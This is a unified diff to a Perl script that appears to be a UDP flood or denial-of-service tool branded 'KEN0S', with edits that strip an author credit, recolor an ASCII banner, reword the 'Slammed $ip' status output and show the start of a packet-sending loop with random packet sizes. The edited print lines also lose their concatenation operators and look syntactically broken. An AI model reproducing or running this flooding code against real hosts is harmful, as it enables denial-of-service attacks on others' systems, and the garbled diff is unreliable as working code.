@@ -3,10 +3,6 @@
 use Term::ANSIColor qw(:constants);
     $Term::ANSIColor::AUTORESET = 2;
 
-##
-# VapeDaddy 
-##
-
 use Socket;
 use strict;
 
@@ -22,7 +18,7 @@ print BOLD RED<<EOTEXT;
 
 EOTEXT
 
-print " ██ ▄█▀▓█████  ███▄    █  ▒█████    ██████ 
+print color("cyan"), " ██ ▄█▀▓█████  ███▄    █  ▒█████    ██████ 
  ██▄█▒ ▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▒██    ▒ 
 ▓███▄░ ▒███   ▓██  ▀█ ██▒▒██░  ██▒░ ▓██▄   
 ▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░  ▒   ██▒
@@ -31,10 +27,11 @@ print " ██ ▄█▀▓█████  ███▄    █  ▒████
 ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░░ ░    ░      ░   ░ ░ ░ ░ ░ ▒  ░  ░  ░  
 ░  ░      ░  ░         ░     ░ ░        ░  
-                                           " . ($port ? $port : "KEN0S Slammed $ip ") . "on port " . 
-  ($size ? "$size-Slammed" : "65500") . "PPS: 63kbs" . 
+                                           "
+  ($port ? $port : "KEN0S Slammed $ip ")
+  ($size ? "$size-Slammed" : "65500") . " PPS: 63kbs" . 
   ($time ? " for $time seconds" : "") . "\n";
-print "Stop NULLING With Ctrl-C\n" unless $time;
+print "Stop slamming With Ctrl-C\n" unless $time;
  
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
